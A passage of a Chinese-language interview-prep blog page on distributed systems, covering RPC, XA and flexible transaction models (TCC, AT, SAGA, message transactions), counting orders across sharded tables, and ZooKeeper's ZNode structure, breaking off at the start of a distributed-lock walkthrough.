<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.<span class="keyword">out</span>.println(result); <span class="comment">// 输出: Hello, Alice!</span></span><br></pre></td></tr></table></figure>
<h2 id="🚀-RPC-的核心特点"><strong>🚀 RPC 的核心特点</strong></h2>
<ol>
<li><strong>透明调用</strong>：像调用本地函数一样调用远程服务。</li>
<li><strong>序列化与反序列化</strong>：数据转换以适应网络传输。</li>
<li><strong>底层通信协议</strong>：基于 TCP、HTTP、gRPC、Thrift、Dubbo 等实现。</li>
<li><strong>服务端与客户端分离</strong>：支持跨语言调用（Java 服务器，Python 客户端）。</li>
<li><strong>高效传输</strong>：优化网络通信，提高性能。</li>
</ol>
<h2 id="🔥-RPC-的应用场景"><strong>🔥 RPC 的应用场景</strong></h2>
<p>✅ <strong>分布式系统</strong>（微服务架构、跨服务器调用） ✅ <strong>跨语言服务调用</strong>（比如 Python 调用 Java 服务） ✅ <strong>云计算、微服务通信</strong>（Kubernetes、Docker 等环境） ✅ <strong>企业级服务架构</strong>（Dubbo、gRPC、Thrift 等 RPC 框架）</p>
<h1>基于XA的分布式事务</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM0ZTNhY2E2MDA1ZTlkZTY2NDcwMGUzNWZlZDVhNDVfSlUxZVkwSzNuMnpiMmVRRlNnUkExS1RRNUpMUk5yd0tfVG9rZW46Sm93eGJ1YVQ1b2ZTcUx4OWlpYmNGUVRnbnFiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-一句话理解">✅ 一句话理解</h2>
<blockquote>
<p><strong>XA 是一种标准的“<strong><strong>分布式</strong></strong>两阶段提交协议”</strong>，用于在多个数据库或资源之间协调事务，确保“要么全部成功，要么全部失败”。</p>
</blockquote>
<h2 id="📖-什么是-XA-协议？">📖 什么是 XA 协议？</h2>
<p><strong>XA</strong> 是由 <strong>X/Open 组织</strong> 提出的 <strong>分布式****事务处理标准</strong>，包含：</p>
<ul>
<li><strong>一个全局事务管理器（Transaction Manager, TM）</strong></li>
<li><strong>多个资源管理器（Resource Manager, RM）</strong>，比如 MySQL、Oracle、消息队列等</li>
</ul>
<h2 id="🔁-XA-的典型场景">🔁 XA 的典型场景</h2>
<p>比如：你要同时更新两个数据库：</p>
<ul>
<li>A 数据库：扣库存</li>
<li>B 数据库：加积分</li>
</ul>
<p>你希望这两个动作要么<strong>一起成功</strong>，要么<strong>都回滚</strong></p>
<p>👉 这就是“分布式事务”</p>
<h3 id="🧠-示例流程（如下图逻辑）：">🧠 示例流程（如下图逻辑）：</h3>
<ol>
<li>TM 开启全局事务</li>
<li>调用 RM1（扣库存） → 返回 prepare 成功</li>
<li>调用 RM2（加积分） → 返回 prepare 成功</li>
<li>所有都准备好 → 进入阶段二 → TM 发送 commit</li>
<li>所有 RM 提交 → 完成事务 （任意失败 → TM 通知全部 rollback）</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTE0Njk5Njk5N2E1NmMzNGM2OGE0MTAxNDJmNzg0M2RfQVZqVlNzdUpraWR4NTc5SUJqYnl2WmNldWpmYmdTdUpfVG9rZW46SUc3dWJqdmU1b0c0OXl4MFdBbGM3VVhzbjViXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="⚠️-缺点（面试必问）">⚠️ 缺点（面试必问）</h2>
<ul>
<li><strong>性能开销大</strong>：需要锁定资源等待 TM 指令，影响吞吐量</li>
<li><strong>阻塞性</strong>：如果 TM 宕机，参与者事务处于不确定状态（称为“脑裂”）</li>
<li><strong>不适合高并发场景</strong></li>
</ul>
<h2 id="✅-总结一句话面试答法：">✅ 总结一句话面试答法：</h2>
<blockquote>
<p>基于 XA 的分布式事务是通过两阶段提交协议实现的强一致事务模型，协调多个资源在一个全局事务中提交或回滚，常用于跨数据库、消息队列等强一致场景，但存在性能和阻塞性问题。</p>
</blockquote>
<blockquote>
<p>跨库事务也是分布式的数据库集群要面对的棘手事情。 合理采用分表，可以在降低单表数据量的情况下，尽量使用本地事务，善于使用同库不同表可有效避免分布式事务带来的麻烦。 在不能避免跨库事务的场景，有些业务仍然需要保持事务的一致性。 而基于 XA 的分布式事务由于在并发度高的场景中性能无法满足需要，并未被互联网巨头大规模使用，他们大多采用最终一致性的柔性事务代替强一致事务</p>
</blockquote>
<h3 id="📌-原文：">📌 原文：</h3>
<blockquote>
<p><strong>跨库事务也是<strong><strong>分布式</strong></strong>的数据库集群要面对的棘手事情。</strong></p>
</blockquote>
<h3 id="✅-解释：">✅ 解释：</h3>
<ul>
<li>当一个业务操作要同时修改<strong>多个数据库</strong>中的数据，就构成了<strong>跨库事务</strong>，这就是<strong>分布式****事务</strong>；</li>
<li>这种场景常出现在 <strong>分库分表之后</strong>，比如订单系统、支付系统、库存系统分散在多个数据库中。</li>
</ul>
<blockquote>
<p><strong>合理采用分表，可以在降低单表数据量的情况下，尽量使用本地事务，善于使用同库不同表可有效避免<strong><strong>分布式</strong></strong>事务带来的麻烦。</strong></p>
</blockquote>
<h3 id="✅-解释：-2">✅ 解释：</h3>
<ul>
<li>把一个表按规则<strong>切分成多个小表</strong>（分表），可以减轻单表数据量、提升查询效率；</li>
<li>如果分片策略设计得合理，让相关的业务数据（如订单主表、订单明细表）都<strong>落在同一个库中不同的表</strong>，就可以用<strong>本地事务</strong>完成提交；</li>
<li>这样就能<strong>避免使用<strong><strong>分布式事务协调器</strong></strong>（如 XA、TCC）</strong>，大大简化事务控制，也提升性能。</li>
</ul>
<blockquote>
<p><strong>在不能避免跨库事务的场景，有些业务仍然需要保持事务的一致性。</strong></p>
</blockquote>
<h3 id="✅-解释：-3">✅ 解释：</h3>
<ul>
<li>比如：支付时需要扣库存 + 记账积分，两个动作分属不同库，但业务上必须“要么一起成功，要么都失败”；</li>
<li>此时就必须通过某种方式来保证这两个操作的一致性。</li>
</ul>
<blockquote>
<p><strong>而基于 XA 的<strong><strong>分布式</strong></strong>事务由于在并发度高的场景中性能无法满足需要，并未被互联网巨头大规模使用</strong></p>
</blockquote>
<h3 id="✅-解释：-4">✅ 解释：</h3>
<ul>
<li>XA 虽然能保证强一致性，但本质上是 <strong>阻塞型、同步型的两阶段提交</strong>：
<ul>
<li>一阶段所有库 prepare，必须全部准备好才能 commit；</li>
<li>中间挂住资源，严重拖慢性能；</li>
</ul>
</li>
<li>高并发下，XA 会<strong>导致线程阻塞、连接占满、写入变慢</strong>；</li>
<li>所以它<strong>不适合高并发场景（如电商、社交）</strong>；</li>
<li>腾讯、阿里、字节等大厂几乎都<strong>不在核心业务中用 XA</strong>。</li>
</ul>
<blockquote>
<p><strong>他们大多采用<strong><strong>最终一致性</strong></strong>的柔性事务代替强一致事务。</strong></p>
</blockquote>
<h3 id="✅-解释：-5">✅ 解释：</h3>
<ul>
<li>“柔性事务”指的是：不强求“立刻一致”，而是允许短暂不一致，但<strong>最终一定要一致</strong>；</li>
<li>最常见的方式包括：
<ul>
<li><strong>消息事务</strong>（如 RocketMQ 半事务）</li>
<li><strong>本地消息表 + 定时补偿</strong></li>
<li><strong>TCC 模式（Try-Confirm-Cancel）</strong></li>
<li><strong>SAGA 模式</strong></li>
</ul>
</li>
</ul>
<p>这些方案能保证系统的可用性和扩展性，是<strong>互联网架构中更主流的做法</strong>。</p>
<h2 id="✅-总结一句话可以这样讲：">✅ 总结一句话可以这样讲：</h2>
<blockquote>
<p>虽然基于 XA 的分布式事务能保证强一致性，但由于性能差、阻塞性强，在高并发场景不适用。实际工程中我们通常通过合理分片、绑定表等方式落在同库，用本地事务处理；当必须跨库时，采用最终一致性的方案（如消息事务或 TCC）来替代传统强一致事务，是当前互联网架构的主流。</p>
</blockquote>
<h2 id="多个分布式事务模型对比（XA、TCC、AT、SAGA、消息事务）">多个分布式事务模型对比（XA、TCC、AT、SAGA、消息事务）</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2VlM2FiNmRiYzg3OWJlMjRkZGQ2ZDc4NWEzM2VjNzVfWlVLWlFaNkhUTjRMTjhkT1N0WlloOURMUXlzZGY3dHpfVG9rZW46TnREemJPNTk4b1FCaVl4QkZYb2NPQWlCbnZLXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="📌-每种方案简要说明-使用建议">📌 每种方案简要说明 + 使用建议</h2>
<h3 id="🔴-XA（2PC）">🔴 <strong>XA（2PC）</strong></h3>
<ul>
<li>两阶段提交协议，资源必须支持 XA（如 MySQL XA）</li>
<li>强一致，但同步阻塞，性能低</li>
<li>✅ <strong>适合：银行转账、合同签署等严谨场景</strong></li>
<li>❌ <strong>不适合高并发</strong></li>
</ul>
<h3 id="🟡-TCC-模式">🟡 <strong>TCC 模式</strong></h3>
<ul>
<li>每个参与方都实现 <code>Try</code>（预操作）、<code>Confirm</code>（提交）、<code>Cancel</code>（撤销）</li>
<li>逻辑最清晰，控制最精细，但开发成本最高</li>
<li>✅ <strong>适合：可预留资源的业务</strong>（如扣库存、锁座位）</li>
</ul>
<h3 id="🔵-AT-模式（Seata-专属）">🔵 <strong>AT</strong> <strong>模式（Seata 专属）</strong></h3>
<ul>
<li>自动生成 UndoLog，本地事务+全局提交</li>
<li>不需要开发多个阶段逻辑</li>
<li>✅ <strong>适合：对一致性要求中等、操作为纯</strong> <strong>SQL</strong> <strong>的场景</strong></li>
</ul>
<h3 id="🟢-消息事务（最终一致）">🟢 <strong>消息事务（最终一致）</strong></h3>
<ul>
<li>半消息 → 本地操作 → 提交消息 → 业务消费</li>
<li>异步解耦、吞吐量大</li>
<li>✅ <strong>适合：积分发放、优惠券到账、异步订单通知等非关键链路</strong></li>
</ul>
<h2 id="🧠-面试推荐回答思路">🧠 面试推荐回答思路</h2>
<blockquote>
<p>在实际项目中，我们通常优先考虑“局部一致 + 最终一致”的方式：</p>
<ul>
<li>如果可以用 <strong>本地事务解决，就避免引入<strong><strong>分布式</strong></strong>事务</strong>；</li>
<li>若跨服务但不强一致，首选 <strong>消息事务</strong>（RocketMQ 半消息、本地消息表）；</li>
<li>对于冻结类场景（如座位、库存），考虑 <strong>TCC 模式</strong>；</li>
<li>极少数核心金融场景可用 <strong>XA 模式</strong>，但注意性能代价； 整体上，我们追求的是“能不强一致，就用柔性一致”。</li>
</ul>
</blockquote>
<blockquote>
<p>在实际项目中，我会优先选择“最终一致”类的柔性事务方案。</p>
<ul>
<li>如果操作需要预留资源，比如锁库存，我会选 <strong>TCC</strong>，粒度细控制力强；</li>
<li>如果只涉及数据库操作，用 <strong>AT 模式</strong>最省事（Seata 封装好）；</li>
<li>如果业务是长链路（比如多阶段审批），用 <strong>SAGA 模式</strong>更合适，支持补偿；</li>
<li>对于异步通知类的非核心流程，<strong>消息事务</strong>最常用，像 RocketMQ 半事务 或 本地消息表机制都非常成熟。</li>
</ul>
</blockquote>
<h2 id="🧩-1-TCC-模式-—【下单-锁库存】">🧩 1. TCC 模式 —【下单+锁库存】</h2>
<h3 id="📚-场景：">📚 场景：</h3>
<p>用户在商城下单，需要：</p>
<ul>
<li><strong>扣减库存（库存服务）</strong></li>
<li><strong>创建订单（订单服务）</strong></li>
</ul>
<p>我们用 TCC 模式将其分为 3 个阶段👇</p>
<h3 id="✅-步骤详解：">✅ 步骤详解：</h3>
<h4 id="🔹-Try（预处理阶段）：">🔹 Try（预处理阶段）：</h4>
<ul>
<li>订单服务调用库存服务的 <code>tryLockStock()</code> 方法</li>
<li>库存服务把商品的库存数量<strong>冻结</strong>（预留但不减）</li>
<li>数据库状态示例：</li>
<li><code>商品ID: 1001, 剩余: 100, 冻结: 1</code></li>
</ul>
<h4 id="🔹-Confirm（确认提交）：">🔹 Confirm（确认提交）：</h4>
<ul>
<li>用户支付成功</li>
<li>订单服务调用库存服务的 <code>confirmLockStock()</code> 方法</li>
<li>库存正式扣减、冻结字段归零</li>
<li><code>商品ID: 1001, 剩余: 99, 冻结: 0</code></li>
</ul>
<h4 id="🔹-Cancel（回滚释放）：">🔹 Cancel（回滚释放）：</h4>
<ul>
<li>如果支付失败/用户取消订单</li>
<li>调用 <code>cancelLockStock()</code>，释放冻结的库存</li>
<li><code>商品ID: 1001, 剩余: 100, 冻结: 0</code></li>
</ul>
<p>📌 每个服务都要提供这 <strong>三套接口</strong>，所以 TCC 控制力强，但编码复杂。</p>
<h2 id="🧩-2-AT-模式-—【下单-扣库存（同库或同框架）】">🧩 2. AT 模式 —【下单 + 扣库存（同库或同框架）】</h2>
<h3 id="📚-场景：-2">📚 场景：</h3>
<p>订单服务直接修改订单表、库存表（都在支持 AT 的数据库中）。</p>
<h3 id="✅-步骤详解（由-Seata-自动处理）：">✅ 步骤详解（由 Seata 自动处理）：</h3>
<h4 id="🔹-执行业务-SQL：">🔹 执行业务 SQL：</h4>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> stock <span class="keyword">SET</span> <span class="built_in">count</span> = <span class="built_in">count</span> - <span class="number">1</span> <span class="keyword">WHERE</span> id = <span class="number">1001</span>;</span><br></pre></td></tr></table></figure>
<h4 id="🔹-在执行时，Seata-拦截-SQL，记录-UndoLog-快照：">🔹 在执行时，<strong>Seata 拦截</strong> <strong>SQL</strong>，记录 <strong>UndoLog</strong> 快照：</h4>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">UndoLog</span>: 商品ID: <span class="number">1001</span>, 变更前: <span class="number">100</span>, 变更后: <span class="number">99</span></span><br></pre></td></tr></table></figure>
<h4 id="🔹-提交成功后：">🔹 提交成功后：</h4>
<ul>
<li>Seata 删除 UndoLog</li>
<li>数据真正提交</li>
</ul>
<h4 id="🔹-如果事务失败：">🔹 如果事务失败：</h4>
<ul>
<li>Seata 用 UndoLog 自动回滚：</li>
<li><code>UPDATE stock SET count = 100 WHERE id = 1001;</code></li>
</ul>
<p>📌 编码简单，不需要写三段逻辑，但只能用于数据库类操作。</p>
<h2 id="🧩-3-SAGA-模式-—【机票-酒店-租车-多阶段链路】">🧩 3. SAGA 模式 —【机票 + 酒店 + 租车 多阶段链路】</h2>
<h3 id="📚-场景：-3">📚 场景：</h3>
<p>用户下单后，要依次预订：</p>
<ul>
<li>航班</li>
<li>酒店</li>
<li>租车</li>
</ul>
<p>这些操作<strong>一旦完成就不可回滚，但可以补偿（如退款）</strong>，所以适合用 SAGA。</p>
<h3 id="✅-步骤详解：-2">✅ 步骤详解：</h3>
<h4 id="🔹-子事务1：预订航班（FlightService-bookFlight）">🔹 子事务1：预订航班（FlightService.bookFlight）</h4>
<ul>
<li>成功立即生效，生成票号</li>
<li>补偿操作：FlightService.cancelFlight()</li>
</ul>
<h4 id="🔹-子事务2：预订酒店（HotelService-bookRoom）">🔹 子事务2：预订酒店（HotelService.bookRoom）</h4>
<ul>
<li>成功立即扣款/占房</li>
<li>补偿操作：HotelService.refundRoom()</li>
</ul>
<h4 id="🔹-子事务3：预订租车">🔹 子事务3：预订租车</h4>
<ul>
<li>失败！</li>
</ul>
<h4 id="🔁-此时开始补偿：">🔁 此时开始补偿：</h4>
<ul>
<li>调用 flight.cancelFlight()，退票</li>
<li>调用 hotel.refundRoom()，退房</li>
</ul>
<p>📌 每个步骤都要提供对应的“反操作”，适用于长流程、低强一致场景。</p>
<h2 id="🧩-4-消息事务-—【用户下单后异步发放优惠券】">🧩 4. 消息事务 —【用户下单后异步发放优惠券】</h2>
<h3 id="📚-场景：-4">📚 场景：</h3>
<p>下单成功后要：</p>
<ul>
<li>创建订单（本地事务）</li>
<li>发放优惠券（异步，不能丢，但可以晚）</li>
</ul>
<h3 id="✅-步骤详解（以-RocketMQ-为例）：">✅ 步骤详解（以 RocketMQ 为例）：</h3>
<h4 id="🔹-Step-1：发送“半消息”到-MQ">🔹 Step 1：发送“半消息”到 MQ</h4>
<ul>
<li>暂不投递给消费者</li>
<li>MQ 记录为【待确认】</li>
</ul>
<h4 id="🔹-Step-2：执行本地订单插入事务">🔹 Step 2：执行本地订单插入事务</h4>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT <span class="keyword">INTO</span> orders (<span class="params">...</span>) VALUES (<span class="params">...</span>);</span><br></pre></td></tr></table></figure>
<h4 id="🔹-Step-3：">🔹 Step 3：</h4>
<ul>
<li>如果订单成功，调用 MQ 的 <strong>commit 消息</strong></li>
<li>消息正式投递</li>
</ul>
<h4 id="🔹-Step-4：消费者收到消息，发放优惠券">🔹 Step 4：消费者收到消息，发放优惠券</h4>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT <span class="keyword">INTO</span> user_coupon (<span class="params">...</span>) VALUES (<span class="params">...</span>);</span><br></pre></td></tr></table></figure>
<p>📌 非阻塞、吞吐大，适合异步补充逻辑。但要处理消息重试、幂等性。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWQ2M2VkNTZkYTgwZGZmNDdiNjJhNzg3ODQ2NzJkNjdfaHllelRaN3c4RkZESHdZR0FLYVRrWDVXZkNCdEhuODJfVG9rZW46Q3ZhM2JCeEl3b3BTMWx4eHhIOGNLNTl3bmRoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>OLAP、OLTP</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTBiMzJjMWI4MWZhYzg5YTYxNzk1NzYxYzVjNGQ4YWZfVURKQ0xyNkdhV0hTd053aG5HWGxSNkdqQ2h0b2E0dlRfVG9rZW46Q1BuOWJabmJnb1I5UTZ4UFVpaWN5VkVQbk5jXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>12306项目中订单数据采用了分库分表，那假如我想统计在某个时间段内订单量怎么办？</h1>
<blockquote>
<p>✅ 在做了 <strong>分库分表</strong> 的情况下，<strong>如何进行跨库聚合查询？</strong> 也就是：<strong>统计类查询如何解决？</strong></p>
</blockquote>
<h2 id="✅-一句话回答思路：">✅ 一句话回答思路：</h2>
<blockquote>
<p>可以通过中间层聚合、数据同步到 OLAP 系统 或 使用中间件支持的分布式聚合查询，来统计分库分表后的订单量。</p>
</blockquote>
<h2 id="🔍-详细回答思路（适合面试）">🔍 详细回答思路（适合面试）</h2>
<h3 id="🎯-面试官问题：">🎯 面试官问题：</h3>
<blockquote>
<p>在 12306 项目中，你们订单数据分库分表了，那怎么统计某个时间段内的订单总量？</p>
</blockquote>
<h3 id="✅-答案结构建议如下👇">✅ 答案结构建议如下👇</h3>
<h3 id="1、先说明：确实存在这个问题"><strong>1、先说明：确实存在这个问题</strong></h3>
<blockquote>
<p>是的，订单表分库分表后，常规 SQL 无法一次性统计所有数据，因为每个库每张表都只保存了部分订单。</p>
</blockquote>
<h3 id="2、然后给出几种可选方案（含真实工程做法）"><strong>2、然后给出几种可选方案（含真实工程做法）</strong></h3>
<h4 id="✅-方案一：通过中间层聚合（适用于统计不频繁）">✅ 方案一：通过中间层聚合（适用于统计不频繁）</h4>
<blockquote>
<p>我们可以通过业务中间层程序（如 Java 服务）<strong>并发访问所有分片表</strong>，执行同一个 SQL，比如：</p>
</blockquote>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(*) <span class="keyword">FROM</span> t_order_0 <span class="keyword">WHERE</span> create_time <span class="keyword">BETWEEN</span> ? <span class="keyword">AND</span> ?</span><br></pre></td></tr></table></figure>
<blockquote>
<p>然后把每张表的结果<strong>汇总加总</strong>，得到最终统计值。</p>
<p>⚠️ 缺点是性能差、不实时、实现麻烦，不适合频繁查询场景。</p>
</blockquote>
<h4 id="✅-方案二：定时汇总-Redis-缓存结果（我推荐）">✅ 方案二：定时汇总 + Redis 缓存结果（我推荐）</h4>
<blockquote>
<p>实际中，我们会<strong>定时任务（如每5分钟）遍历所有分片表统计订单数</strong>，将结果汇总写入 Redis。</p>
<p>当用户请求统计时，直接从 Redis 拿缓存数据，<strong>提升性能，降低对数据库的压力</strong>。</p>
<p>例如可以缓存成：</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">order_count</span>:<span class="number">2024</span>-<span class="number">04</span>-<span class="number">10</span>:hour:<span class="number">09</span> = <span class="number">23123</span></span><br></pre></td></tr></table></figure>
<h4 id="✅-方案三：同步到-OLAP-实时分析系统（ClickHouse、Doris）">✅ 方案三：同步到 OLAP 实时分析系统（ClickHouse、Doris）</h4>
<blockquote>
<p>我们还可以将订单数据通过 <strong>Binlog → Flink → Kafka→ OLAP 系统</strong> 做一份副本， 比如同步到 ClickHouse，用来支撑实时数据大屏或运营分析。</p>
<p>然后直接用 SQL 聚合查询 OLAP 表：</p>
</blockquote>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(*) <span class="keyword">FROM</span> ods_order <span class="keyword">WHERE</span> create_time <span class="keyword">BETWEEN</span> ? <span class="keyword">AND</span> ?</span><br></pre></td></tr></table></figure>
<blockquote>
<p>优点是性能高、查询快、不影响业务主库。</p>
</blockquote>
<h4 id="✅-方案四：使用分布式中间件（ShardingSphere-的广播聚合）">✅ 方案四：使用分布式中间件（ShardingSphere 的广播聚合）</h4>
<blockquote>
<p>ShardingSphere 也支持 <code>SELECT COUNT(*)</code> 类型的聚合查询， 可以在逻辑表上执行，内部自动拆成多分片查询再汇总结果。</p>
<p>⚠️ 但前提是查询字段必须有分片键，并且代价较高，不建议频繁使用。</p>
</blockquote>
<h3 id="3、最后补一句项目中怎么做的（加分项）"><strong>3、最后补一句项目中怎么做的（加分项）</strong></h3>
<blockquote>
<p>我们项目中对运营指标的统计是用 Redis 缓存加定时任务的方式落地的， 部分需要长期趋势分析的订单数据也同步进了 ClickHouse 做 BI 报表支撑， 这样既保证了业务库的写性能，也满足了多维度分析需求。</p>
</blockquote>
<h2 id="🧠-面试官爱听的关键词：">🧠 面试官爱听的关键词：</h2>
<ul>
<li>“数据汇总中间层”</li>
<li>“Redis 缓存统计值”</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[MySQL订单数据]</span><br><span class="line">      ↓ Binlog</span><br><span class="line">[Flink CDC]（监听变更）</span><br><span class="line">      ↓</span><br><span class="line">    [Kafka]（中间缓冲）</span><br><span class="line">      ↓</span><br><span class="line">[ClickHouse/Doris]（分析存储）</span><br><span class="line">      ↓</span><br><span class="line">    [BI工具]（图表报表）</span><br></pre></td></tr></table></figure>
<h1>Zookeeper</h1>
<blockquote>
<p><strong>ZooKeeper 是一个为分布式应用提供一致性服务的软件</strong>，它内部是一个分层的文件系统目录树结构，规定同一个目录下只能有一个唯一文件名。</p>
</blockquote>
<h2 id="✅-一、ZooKeeper-是什么？">✅ 一、ZooKeeper 是什么？</h2>
<h3 id="📌-定义：">📌 定义：</h3>
<blockquote>
<p><strong>ZooKeeper 是 Apache 开源的一个“分布式协调服务”</strong>，用于解决分布式系统中的<strong>一致性问题</strong>（如：谁是主节点？锁是否被释放？配置有没有变？）。</p>
</blockquote>
<h2 id="🧠-为什么需要-ZooKeeper？">🧠 为什么需要 ZooKeeper？</h2>
<p>在分布式环境中，多台机器之间必须：</p>
<ul>
<li>保证<strong>谁是主节点</strong>（主备选举）</li>
<li>保证<strong>配置是一致的</strong></li>
<li>实现<strong>分布式锁</strong></li>
<li>维护<strong>服务注册/发现</strong></li>
</ul>
<p>但多节点之间容易出现：</p>
<ul>
<li>网络分区</li>
<li>主从不一致</li>
<li>并发竞争</li>
</ul>
<p>👉 所以我们引入 ZooKeeper 来提供这些“一致性保证”。</p>
<h2 id="✅-二、ZooKeeper-的核心结构：目录树（ZNode）">✅ 二、ZooKeeper 的核心结构：目录树（ZNode）</h2>
<blockquote>
<p>它的存储结构像一个“文件系统”，每个节点称为 <strong>ZNode</strong>。</p>
</blockquote>
<h3 id="📁-类比文件系统的例子：">📁 类比文件系统的例子：</h3>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ ``├── config/ ``│   ├── db_host     --&gt; <span class="string">&quot;127.0.0.1&quot;</span>` `│   └── db_port     --&gt; <span class="string">&quot;3306&quot;</span>` `├── lock/ ``│   └── order_lock  --&gt; 分布式锁临时节点 ``├── service/ ``│   └── order-service/ ``│       ├── instance-<span class="number">1</span>  --&gt; IP+Port ``│       └── instance-<span class="number">2</span></span><br></pre></td></tr></table></figure>
<h3 id="✅-ZNode-特点：">✅ ZNode 特点：</h3>
<ul>
<li>每个节点都可以存储<strong>小量数据</strong>（最大1MB）</li>
<li>只能有唯一名字（一个目录下同名不允许）</li>
<li>可以是：
<ul>
<li><strong>临时节点</strong>：会话断开自动删除</li>
<li><strong>顺序节点</strong>：自动编号，常用于排队</li>
</ul>
</li>
</ul>
<h3 id="📌-举例说明目录唯一性：">📌 举例说明目录唯一性：</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">创建节点 /<span class="keyword">order</span><span class="params">-service</span>/ip_1 <span class="string">``</span>✔️ 成功 <span class="string">``</span>再次创建 /<span class="keyword">order</span><span class="params">-service</span>/ip_1 <span class="string">``</span>❌ 报错：节点已存在 <span class="string">``</span>但可以创建 /<span class="keyword">order</span><span class="params">-service</span>/ip_2 ✔️</span><br></pre></td></tr></table></figure>
<p>这就像 Linux 文件系统下的目录结构。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjhlMWJhYzMzMTM5ODNiMmEzYjA0MWEyZWZhMDRlNjFfS1RSRHRNNUpPUWtkRHl1TTNDckFiYlRzNEk4a3RVdFBfVG9rZW46Q1gzOGJxQlpPb0czbm14dGlxUWNsSVU1bjRmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-四、ZooKeeper-的一致性协议：ZAB">✅ 四、ZooKeeper 的一致性协议：ZAB</h2>
<p>ZooKeeper 使用自己的一致性协议 <strong>ZAB（ZooKeeper Atomic Broadcast）</strong>，保证：</p>
<ul>
<li>读写线性一致</li>
<li>少数节点失败不影响整体写入</li>
<li>支持选举和 failover（主节点挂了自动选新主）</li>
</ul>
<p>这使它非常适合当作分布式协调中心。</p>
<h2 id="✅-总结你面试时可以这么说：">✅ 总结你面试时可以这么说：</h2>
<blockquote>
<p>ZooKeeper 是一个开源的分布式协调服务，它内部是一个类似文件系统的树形结构，每个节点叫 ZNode，命名唯一。通过 ZNode 存储临时/配置/顺序信息，可以实现主从选举、分布式锁、服务注册、统一配置管理等分布式系统关键功能。</p>
</blockquote>
<h2 id="用-ZooKeeper-实现分布式锁的关键原理">用 ZooKeeper 实现分布式锁的关键原理</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODUyMGMyYzZkZTMxZmUxYTIzMmI1MjQ3YzJjZWI3ZmJfN3Z4VDFBdmpYWVBaTTZKMGVQZjBxd2I3Nnd4bWwwQlBfVG9rZW46TEpGaGJvZzlBb2xjNHd4RG56bmN5NmRvbjJjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🔧-实现流程（以-lock-为锁目录）">🔧 实现流程（以 <code>/lock</code> 为锁目录）</h2>
<p>假设 3 个客户端要竞争一个“订单锁”，过程如下 👇</p>
<h3 id="🧩-Step-by-step-详细流程（图解式）">🧩 Step-by-step 详细流程（图解式）</h3>
<h4 id="1、所有客户端都向-lock-节点下-创建顺序临时节点：">1、所有客户端都向 <code>/lock</code> 节点下 <strong>创建顺序临时节点</strong>：</h4>
